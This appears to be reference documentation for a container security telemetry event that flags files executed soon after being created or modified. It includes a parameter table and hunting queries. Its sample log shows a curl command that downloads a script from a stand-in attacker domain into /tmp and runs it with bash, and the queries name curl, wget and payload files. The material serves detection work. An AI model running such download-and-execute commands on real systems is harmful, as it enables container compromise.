## RecentlyModifiedFileExecutedInContainer Table: Recently Modified File Execution Event

### 1. Table Name
**RecentlyModifiedFileExecutedInContainer**

---

### 2. Table Usage
This event is generated when a file that was recently created or modified inside a container is executed. This is a common attack pattern where an adversary drops a payload or script into a container and then immediately executes it. Monitoring this behavior is crucial for detecting container-based threats, such as cryptojacking, reverse shells, or other malicious activities.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the executable that was run (e.g., `/bin/bash`). | Linux, Falcon Container |
| CommandLine | The full command line used to execute the recently modified file. | Linux, Falcon Container |
| ParentImageFileName | The full path to the parent process that spawned the process which executed the file (e.g., `/usr/bin/curl`). | Linux, Falcon Container |
| ParentCommandLine | The command line of the parent process. | Linux, Falcon Container |
| TargetFileName | The path to the recently modified file that was executed. | Linux, Falcon Container |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "/bin/bash",
  "CommandLine": "/bin/bash /tmp/payload.sh",
  "ParentImageFileName": "/usr/bin/curl",
  "ParentCommandLine": "curl [http://evil-domain.com/payload.sh](http://evil-domain.com/payload.sh) -o /tmp/payload.sh",
  "TargetFileName": "/tmp/payload.sh"
}
```

---

### 5. Example Queries

```xql
// Find all instances of recently modified files being executed in containers
event_simpleName=RecentlyModifiedFileExecutedInContainer

// Hunt for scripts being executed from common temporary or writable directories
event_simpleName=RecentlyModifiedFileExecutedInContainer TargetFileName="/tmp/*" OR TargetFileName="/var/tmp/*"

// Find recently modified files that were executed by a shell
event_simpleName=RecentlyModifiedFileExecutedInContainer ImageFileName IN ("/bin/bash", "/bin/sh")

// Investigate what files are being executed immediately after being downloaded by curl or wget
event_simpleName=RecentlyModifiedFileExecutedInContainer ParentImageFileName IN ("/usr/bin/curl", "/usr/bin/wget")

// Look for specific suspicious file names being executed
event_simpleName=RecentlyModifiedFileExecutedInContainer TargetFileName="*payload*" OR TargetFileName="*shell*"
```
---